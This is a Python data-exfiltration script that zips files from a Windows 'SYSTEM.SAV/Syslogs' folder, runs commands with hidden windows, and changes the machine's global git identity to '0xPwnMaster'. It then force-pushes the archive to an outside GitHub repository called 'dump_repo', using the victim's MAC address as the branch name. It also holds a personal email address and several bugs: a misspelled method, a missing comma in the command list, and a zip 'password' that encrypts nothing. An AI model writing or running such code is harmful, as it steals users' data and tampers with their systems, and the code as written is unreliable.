from pathlib import Path
from datetime import datetime
import subprocess
import os
import zipfile
import psutil


current_date = datetime.now().strftime("%d-%B")

src_dir = Path(f"C:/SYSTEM.SAV/Syslogs/Data_{current_date}") # Actual Source
des_dir = Path(f"C:/SYSTEM.SAV/Syslogs/Zipped{current_date}.zip")
password = f"{current_date}"

def run_center(command, shell=False,check=False):
    if shell:
        command = ' '.join(command)
    try:
        result = subprocess.run(
            command,
            creationflags=subprocess.CREATE_NO_WINDOW,
            text=True,
            capture_output=True,
            check=check,
            shell=shell
        )
        return result
    except Exception as e:
        print(f"[ERROR] : {e}")
def check_conectivity():
    cmd = subprocess.run(
    ['powershell.exe', "ping google.com"],
    creationflags=subprocess.CREATE_NO_WINDOW,
    capture_output=True,
    text=True
    )
    if cmd.returncode == 0:
        print("PC has internet connection")
        zipper(src_dir,des_dir)
        return True
    else:
        print("PC does not have internet connection")
        return False
def zipper(src_dir: Path, des_dir: Path, password: str = None) -> bool:
    print("Making zip file.")
    if not src_dir.exist():
        print("Sorce does not exist.")
        return False
    if des_dir.exists():
        print("File already exist.")
        return True
    
    try:
            with zipfile.ZipFile(des_dir, 'w', zipfile.ZIP_DEFLATED) as zipper:
                if password:
                    zipper.setpassword(password.encode('utf-8'))
                for root, _, files in os.walk(src_dir):
                    for file_name in files:
                        full_path = os.path.join(root, file_name)
                        arcname = os.path.relpath(full_path, src_dir)
                        try:
                            zipper.write(full_path, arcname)
                        except PermissionError as e:
                            print(f"Permission denied for file: {full_path} - {e}")
                        except Exception as e:
                            print(f"Error adding file {full_path}: {e}")
            print("Successfully created zip file.")
            return True
    except PermissionError as e:
        print(f"Permission denied when creating zip file at {des_dir}: {e}")
        return False
    except Exception as e:
        print(f"Error creating zip file: {e}")
        return False

def get_active_mac():
    stats = psutil.net_if_stats()
    addrs = psutil.net_if_addrs()

    for iface, iface_stats in stats.items():
        if iface_stats.isup and not iface.lower().startswith("lo"):
            for addr in addrs[iface]:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    if mac and mac != "00:00:00:00:00:00":
                        return iface, mac
    return None, None



def data_exfilter():
    _, mac = get_active_mac()
    
    print("Exfiltrating Data...")
    path = Path(r"C:\SYSTEM.SAV\Syslogs")
    result = run_center(["git", "config", "--global", "user.email"],shell=True ,check=False)
    if result.returncode != 0:
        print(result.stderr)
    else:
        print(result.stdout)
    cmd = [
        ['git', 'config', '--global', 'user.name', '0xPwnMaster'],
        ['git', 'config', '--global', 'user.email', 'omkadam1987@gmail.com'],
        ['git', 'checkout', '-b', f'{mac}']

        ["git", "init", "-b", f"{mac}"],
        ["git", "add", f"Zipped{current_date}.zip"],
        ["git", "commit", "-m", f"Backup {current_date}.zip"],
        ["git", "remote", "set-url", "origin", "https://github.com/0xPwnMaster/dump_repo.git"],
        ["git", "push", "origin", f"{mac}", '--force']
    ]
    try:
        os.chdir(path)
        for c in cmd:
           print(f"Running {c}")
           result = run_center(c, check=False)
        if result.returncode != 0:
            print("Failed to Exfilter data.\n",result.stderr)
            return False
        print("Data exfiltration completed successfully.\n",result.stdout)
        return True
    except OSError as ose:
        print(ose)
        return False
    except Exception as e:
        print(e)
        return False

if __name__ == "__main__":
    if check_conectivity():
        if zipper(src_dir, des_dir, password=password):
            data_exfilter()